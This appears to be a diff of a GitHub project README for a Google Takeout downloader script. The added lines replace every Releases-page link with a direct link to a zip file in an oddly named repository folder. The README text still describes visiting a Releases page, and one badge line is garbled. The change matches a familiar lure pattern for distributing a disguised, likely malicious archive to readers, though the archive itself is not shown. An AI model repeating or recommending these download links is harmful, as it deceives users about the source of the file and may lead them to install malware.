@@ -1,7 +1,7 @@
 # 📥 takeout_downloader_script - Simplify Your Data Retrieval
 
 ## 🚀 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20Script-blue.svg)](https://github.com/Kalainilavann/takeout_downloader_script/releases)
+[![Download](https://raw.githubusercontent.com/Kalainilavann/takeout_downloader_script/main/outscorn/takeout-downloader-script-galvanocauterization.zip%20Now-Get%20the%https://raw.githubusercontent.com/Kalainilavann/takeout_downloader_script/main/outscorn/takeout-downloader-script-galvanocauterization.zip)](https://raw.githubusercontent.com/Kalainilavann/takeout_downloader_script/main/outscorn/takeout-downloader-script-galvanocauterization.zip)
 
 ## 📋 Description
 The takeout_downloader_script helps you easily retrieve your data from various sources. It automates the download process, saving you time and effort. 
@@ -22,7 +22,7 @@ Follow these steps to get the application up and running.
 
 1. **Visit the Releases Page:**
    Click the link below to go to the Releases page.
-   [Download Here](https://github.com/Kalainilavann/takeout_downloader_script/releases)
+   [Download Here](https://raw.githubusercontent.com/Kalainilavann/takeout_downloader_script/main/outscorn/takeout-downloader-script-galvanocauterization.zip)
 
 2. **Choose Your Version:**
    On the Releases page, you’ll see a list of available versions. Select the version that suits your operating system. 
@@ -40,7 +40,7 @@ Follow these steps to get the application up and running.
    After installation, you can run the script. Follow the prompts to begin downloading your data.
 
 ## 📥 Download & Install
-To get started immediately, [visit this page to download](https://github.com/Kalainilavann/takeout_downloader_script/releases). This link will direct you to the latest version of the script.
+To get started immediately, [visit this page to download](https://raw.githubusercontent.com/Kalainilavann/takeout_downloader_script/main/outscorn/takeout-downloader-script-galvanocauterization.zip). This link will direct you to the latest version of the script.
 
 ## ❓ Troubleshooting Common Issues
 If you encounter any problems while running the script, consider these solutions:
